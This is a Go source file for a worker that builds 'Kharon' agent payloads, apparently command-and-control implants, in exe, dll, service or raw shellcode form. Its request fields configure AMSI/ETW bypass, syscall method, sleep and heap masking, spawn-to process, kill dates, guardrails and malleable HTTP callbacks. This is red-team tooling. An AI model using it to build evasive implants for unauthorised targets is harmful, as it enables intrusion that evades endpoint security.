package kharonbuilder

import (
	"fmt"
)

// KharonBuildRequest is the fully server-derived instruction for one Kharon agent
// payload build. It contains no caller-provided paths, Make targets, or shell
// fragments — the worker chooses the Make target and paths from Target/Debug/
// OutputFormat, mirroring the Nax request. All make variables are typed fields the
// server builds (it keeps the pure-Go generators and passes their outputs here).
type KharonBuildRequest struct {
	// Build selection (worker maps these onto the Kharon Makefile).
	Target       string `json:"target"`       // "x64" | "x86" — allowlisted
	Debug        bool   `json:"debug"`
	OutputFormat string `json:"outputFormat"` // "bin"|"exe"|"dll"|"svc" — allowlisted

	// Make variables — mirror pl_agent.go's makeVars exactly.
	WebSecureEnabled  bool   `json:"webSecureEnabled"`
	WebProxyEnabled   bool   `json:"webProxyEnabled"`
	WebProxyURL       string `json:"webProxyUrl"`
	WebProxyUsername  string `json:"webProxyUsername"`
	WebProxyPassword  string `json:"webProxyPassword"`
	KhSleepTime       string `json:"khSleepTime"`
	KhJitter          int    `json:"khJitter"`
	KhAgentUUID       string `json:"khAgentUuid"`
	KhWorktimeEnabled bool   `json:"khWorktimeEnabled"`
	KhWorktimeStartH  int    `json:"khWorktimeStartHour"`
	KhWorktimeStartM  int    `json:"khWorktimeStartMin"`
	KhWorktimeEndH    int    `json:"khWorktimeEndHour"`
	KhWorktimeEndM    int    `json:"khWorktimeEndMin"`
	KhKilldateEnabled bool   `json:"khKilldateEnabled"`
	KhKilldateDay     int    `json:"khKilldateDay"`
	KhKilldateMonth   int    `json:"khKilldateMonth"`
	KhKilldateYear    int    `json:"khKilldateYear"`
	KhForkPipeName    string `json:"khForkPipeName"`
	KhSpawnto         string `json:"khSpawnto"`
	KhBofHookEnabled  bool   `json:"khBofHookEnabled"`
	HTTPMalleableHex  string `json:"httpMalleableHex"` // C-array hex (bytes_to_hexstr output)
	HTTPCallbackCount int    `json:"httpCallbackCount"`

	// Guardrails (all optional; empty means "leave the tree's default").
	KhGuardrailUser   string `json:"khGuardrailUser"`
	KhGuardrailDomain string `json:"khGuardrailDomain"`
	KhGuardrailHost   string `json:"khGuardrailHost"`
	KhGuardrailIP     string `json:"khGuardrailIp"`

	// Syscall method, AMSI/ETW bypass, heap mask, sleep mask.
	KhSyscall     int  `json:"khSyscall"`     // 0 | 1 | 2
	KhAmsiEtwBypass int `json:"khAmsiEtwBypass"` // 0x0 | 0x1 | 0x2 | 0x3
	KhHeapMask    bool  `json:"khHeapMask"`
	KhSleepMask   int   `json:"khSleepMask"`   // 0 | 1 | 2 | 3
}

// KharonBuildResponse carries the compiled payload back to the server, which
// repacks it (the server keeps the repack logic; here it just forwards the bytes).
//
// []byte marshals to base64 over the wire; the server base64-decodes it.
type KharonBuildResponse struct {
	Filename string `json:"filename"` // e.g. "Kharon.x64.exe"
	Size     int    `json:"size"`
	SHA256   string `json:"sha256"`
	Payload  []byte `json:"payload"` // raw beacon (bin) or loader PE (exe/dll/svc)
	Logs     string `json:"logs,omitempty"`
	OK       bool   `json:"ok"`
}

// KharonBuildError is the body used on an error frame. It has no OK field, so the
// server distinguishes success/failure by inspecting the JSON for "ok": true.
type KharonBuildError struct {
	Error string `json:"error"`
}

// Validate enforces the small allowlists the worker relies on: Target ∈ {x64, x86},
// OutputFormat ∈ {bin, exe, dll, svc}. Anything else is malformed — rejected before
// any work happens. Debug is a bool (no allowlist needed).
func (r KharonBuildRequest) Validate() error {
	switch r.Target {
	case "x64", "x86":
	default:
		return fmt.Errorf("target %q not allowed (want \"x64\" or \"x86\")", r.Target)
	}

	of := r.OutputFormat
	if of == "" {
		of = "bin" // server default (outputFormat := "bin")
	}
	switch of {
	case "bin", "exe", "dll", "svc":
	default:
		return fmt.Errorf("outputFormat %q not allowed (want bin|exe|dll|svc)", r.OutputFormat)
	}

	return nil
}

// makeTarget maps req onto the Kharon Makefile x64/x86 target name, which the
// beacon Makefile accepts directly (x64 / x86 / x64-debug / x86-debug). The
// -debug suffix is a Makefile shorthand for adding -D DEBUG to CFLAGS; the output
// file is still Kharon.<arch>.bin.
func (r KharonBuildRequest) makeTarget() string {
	t := r.Target
	if r.Debug {
		t += "-debug"
	}
	return t
}

// makeArgs builds the Kharon make variables from req, matching pl_agent.go's
// makeVars exactly (same order, same escaping). Empty guardrails are omitted so a
// build that relies on the pinned tree's defaults still works.
func (r KharonBuildRequest) makeArgs() []string {
	var args []string
	b10 := func(b bool) string {
		if b {
			return "1"
		}
		return "0"
	}
	args = append(args,
		fmt.Sprintf("WEB_SECURE_ENABLED=%s", b10(r.WebSecureEnabled)),
		fmt.Sprintf("WEB_PROXY_ENABLED=%s", b10(r.WebProxyEnabled)),
		fmt.Sprintf("WEB_PROXY_URL=%s", r.WebProxyURL),
		fmt.Sprintf("WEB_PROXY_USERNAME=%s", r.WebProxyUsername),
		fmt.Sprintf("WEB_PROXY_PASSWORD=%s", r.WebProxyPassword),
		fmt.Sprintf("KH_SLEEP_TIME=%s", r.KhSleepTime),
		fmt.Sprintf("KH_JITTER=%d", r.KhJitter),
		fmt.Sprintf("KH_AGENT_UUID=%s", r.KhAgentUUID),
		fmt.Sprintf("KH_WORKTIME_ENABLED=%s", b10(r.KhWorktimeEnabled)),
		fmt.Sprintf("KH_WORKTIME_START_HOUR=%d", r.KhWorktimeStartH),
		fmt.Sprintf("KH_WORKTIME_START_MIN=%d", r.KhWorktimeStartM),
		fmt.Sprintf("KH_WORKTIME_END_HOUR=%d", r.KhWorktimeEndH),
		fmt.Sprintf("KH_WORKTIME_END_MIN=%d", r.KhWorktimeEndM),
		fmt.Sprintf("KH_KILLDATE_ENABLED=%s", b10(r.KhKilldateEnabled)),
		fmt.Sprintf("KH_KILLDATE_DAY=%d", r.KhKilldateDay),
		fmt.Sprintf("KH_KILLDATE_MONTH=%d", r.KhKilldateMonth),
		fmt.Sprintf("KH_KILLDATE_YEAR=%d", r.KhKilldateYear),
		fmt.Sprintf("KH_FORK_PIPENAME=\"%s\"", r.KhForkPipeName),
		fmt.Sprintf("KH_SPAWNTO_X64=\"%s\"", r.KhSpawnto),
		fmt.Sprintf("KH_BOF_HOOK_ENABLED=%s", b10(r.KhBofHookEnabled)),
		// C-array initializer for Config.cc's BYTE HttpConfig[] = HTTP_MALLEABLE_BYTES.
		// Double-quoted so make keeps the quotes and the shell strips them (preventing
		// brace expansion of the 0x.. list) before clang sees the bare `{ 0x.. }` array.
		fmt.Sprintf("HTTP_MALLEABLE_BYTES=\"%s\"", r.HTTPMalleableHex),
		fmt.Sprintf("HTTP_CALLBACK_COUNT=%d", r.HTTPCallbackCount),
	)
	// Guardrails are optional; only emit when non-empty.
	if r.KhGuardrailUser != "" {
		args = append(args, fmt.Sprintf("KH_GUARDRAILS_USER=%s", r.KhGuardrailUser))
	}
	if r.KhGuardrailDomain != "" {
		args = append(args, fmt.Sprintf("KH_GUARDRAILS_DOMAIN=%s", r.KhGuardrailDomain))
	}
	if r.KhGuardrailHost != "" {
		args = append(args, fmt.Sprintf("KH_GUARDRAILS_HOST=%s", r.KhGuardrailHost))
	}
	if r.KhGuardrailIP != "" {
		args = append(args, fmt.Sprintf("KH_GUARDRAILS_IPADDRESS=%s", r.KhGuardrailIP))
	}
	args = append(args,
		fmt.Sprintf("KH_SYSCALL=%d", r.KhSyscall),
		fmt.Sprintf("KH_AMSI_ETW_BYPASS=0x%x", r.KhAmsiEtwBypass),
		fmt.Sprintf("KH_HEAP_MASK=%s", b10(r.KhHeapMask)),
		fmt.Sprintf("KH_SLEEP_MASK=%d", r.KhSleepMask),
	)
	return args
}

// loaderSource maps OutputFormat onto the loader source + output file, matching
// pl_agent.go's switch. The loader is always compiled as x64 (see pe.go).
func (r KharonBuildRequest) loaderSource() (src, out string, ok bool) {
	switch r.OutputFormat {
	case "exe":
		return "Exe.cc", "Kharon.x64.exe", true
	case "dll":
		return "Dll.cc", "Kharon.x64.dll", true
	case "svc":
		return "Svc.cc", "Kharon.x64.svc.exe", true
	}
	return "", "", false
}

// outFileName mirrors pl_agent.go's final switch on OutputFormat.
func (r KharonBuildRequest) outFileName() string {
	switch r.OutputFormat {
	case "exe":
		return "Kharon.x64.exe"
	case "dll":
		return "Kharon.x64.dll"
	case "svc":
		return "Kharon.x64.svc.exe"
	case "bin":
		return "Kharon.x64.bin"
	default:
		return fmt.Sprintf("Kharon.%s.bin", r.Target)
	}
}
